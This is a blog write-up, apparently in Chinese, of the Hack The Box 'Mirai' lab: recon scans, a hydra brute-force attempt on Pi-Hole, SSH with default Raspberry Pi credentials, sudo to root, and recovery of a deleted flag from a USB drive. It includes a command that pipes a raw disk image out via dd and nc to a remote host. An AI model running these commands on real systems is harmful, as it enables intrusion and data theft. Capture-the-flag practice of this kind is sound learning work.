---
title: Mirai (Hack The Box Writeup)
date: 2021-09-15T14:01:00+08:00
draft: false
url: "/2021/09/15/mirai-hack-the-box-writeup/"
categories:
  - 滲透測試
  - Hack The Box
showToc: true
TocOpen: false
---

- URL : https://app.hackthebox.eu/machines/64
- IP : 10.129.214.20

## Recon

- http://10.129.214.20/首頁是空ㄉ
- ![](/uploads/2022/02/1ac3d-GuiVLRm.png)Rustscan- ![](/uploads/2022/02/ef0f8-6UNUiSx.png)nmap- `nmap -A -p22,53,80,2000,32400,32469 10.129.214.20`![](/uploads/2022/02/39c82-cUzhFGB.png)dirsearch 掃目錄- ![](/uploads/2022/02/4068d-kH5A7QG.png)32400 Port 跑了一個 PLEX- ![](/uploads/2022/02/d64d8-HGGDcnR.png)Pi-Hole 在 `:80/admin`- ![](/uploads/2022/02/7c43e-AtDs7wt.png)
- https://www.exploit-db.com/exploits/48442需要密碼才能 RCEdnsmasq Exploit  
`https://raw.githubusercontent.com/google/security-research-pocs/master/vulnerabilities/dnsmasq/CVE-2017-14491.py`

## 爆破密碼

- `hydra -l '' -P /opt/wordlists/rockyou.txt 10.129.214.20 http-post-form "/admin/index.php?login:pw=^PASS^:Forgot password"`![](/uploads/2022/02/e05ae-JUZOiSX.png)
- 跑了很久都沒有，應該不是 QQ

## Exploit

- 看到 Pi-Hole 又有 PLEX 影音伺服器猜他是樹梅派所以 pi 預設帳密- `pi / raspberry`SSH- ![](/uploads/2022/02/cb8d8-rlacgEn.png)
- 好無聊 = =取得 User Flag- `ff837707441b257a20e32199d7c8838d`

## 提權

- 起手式 `sudo -l`![](/uploads/2022/02/4c960-yK4zBLq.png)
- 發現可以直接變 root

## 數位鑑識

- 取 root flag![](/uploads/2022/02/96493-BjshpiS.png)
- 搞事ㄛ = =確認外接裝置- ![](/uploads/2022/02/e92df-k6Wxr0n.png)到隨身碟裡找東西- ![](/uploads/2022/02/6e1cd-mkC7OFW.png)
- 詹姆斯在搞ㄛ = =直接暴力解- `strings` 硬碟
- ![](/uploads/2022/02/f3fce-eObJQpt.png)
- `3d3e483143ff12ec505d026fa13e020b`暴力解也可以傳回本地處理- 本地監聽 `nc -l 1234 > usbstick.dump`
- 遠端用 dd 把資料丟出來`sudo dd if=/dev/sdb | nc -w3 10.10.16.35 1234`

## 嘗試失敗的方法 (Testdisk)

- 使用 Testdisk 還原https://blog.gtwang.org/linux/testdisk-linux-recover-deleted-files/用 scp 傳過去- ![](/uploads/2022/02/80452-V62F2Lt.png)解壓縮- ![](/uploads/2022/02/bab26-BBPoXx2.png)用 sudo 執行- ![](/uploads/2022/02/b0787-KnYrwIq.png)選定硬碟 sdb- ![](/uploads/2022/02/ee5c3-oFWPTPS.png)預設沒有分割區- ![](/uploads/2022/02/3e941-Oxf8S78.png)選擇格式- ![](/uploads/2022/02/41554-ZOryLMZ.png)找到刪除的 `root.txt`- ![](/uploads/2022/02/e39ec-KDOh7aX.png)
- 選到 `root.txt` 按 C
- ![](/uploads/2022/02/a07d6-FnV37tP.png)選存檔位置- ![](/uploads/2022/02/2a56c-Bamh5Pm.png)
- ![](/uploads/2022/02/6bd1e-Bz6yOmm.png)
- 但這樣出來的檔案是空的 QQ
